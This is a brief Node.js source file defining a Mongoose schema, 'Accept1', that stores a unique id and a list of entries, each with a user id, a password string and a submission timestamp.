const mongoose = require('mongoose');

const accept1Schema = new mongoose.Schema({
  uniqueid: { type: String, required: true, unique: true },
  entries: [
    {
      userId: { type: String, required: true },
      password: { type: String, required: true },
      submittedAt: { type: Date, default: Date.now }
    }
  ]
});

module.exports = mongoose.model('Accept1', accept1Schema);
